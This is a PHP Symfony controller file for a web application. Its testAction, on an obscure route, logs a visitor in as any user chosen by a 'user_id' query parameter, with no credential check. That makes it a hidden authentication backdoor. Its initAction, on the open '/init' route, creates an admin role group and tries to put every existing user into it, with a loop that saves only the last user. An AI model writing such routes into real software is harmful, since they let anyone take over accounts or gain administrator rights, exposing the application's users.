<?php

namespace AppBundle\Controller;

use Sensio\Bundle\FrameworkExtraBundle\Configuration\Route;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;

use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;


use AppBundle\Entity\Group;

use AppBundle\Form\UserType;
use AppBundle\Form\CompanyAdminType;

class DefaultController extends Controller
{
    /**
     * @Route("/k8f96gtb")
     */
    public function testAction(Request $request)
    {
        $em = $this->getDoctrine()->getManager();

        $user_id = $request->query->get('user_id');
        if($user_id == ''){
            return new Response("user not found");
        }
        $user = $em->getRepository('AppBundle:User')->findOneById($user_id);

        $token = new UsernamePasswordToken($user, $user->getPassword(), "main", $user->getRoles());
        $this->get("security.token_storage")->setToken($token);
        $this->get('session')->set('_security_main',serialize($token));

        $user->setLastLogin(new \DateTime());
        $em->persist($user);
        $em->flush();

        //home
        return $this->redirectToRoute('home');
    }

    /**
     * @Route("/init", name="homepage")
     */
    public function initAction(Request $request)
    {
        $em = $this->getDoctrine()->getManager();
        $group = $em->getRepository('AppBundle:Group')->findOneByName('admin');
        if($group == NULL){
            $group = new Group("admin",['ROLE_ADMIN']);
            $em->persist($group);
            $em->flush();
        }
        $users = $em->getRepository('AppBundle:User')->findUsersContainGroup($group);
        if(count($users) == 0){
            $users = $em->getRepository('AppBundle:User')->findAll($group);
            foreach($users as $user){
                $user->groups = [$group];
            }
            $em->persist($user);
            $em->flush();
        }
        // replace this example code with whatever you need
        return new Response("ok");
    }
}
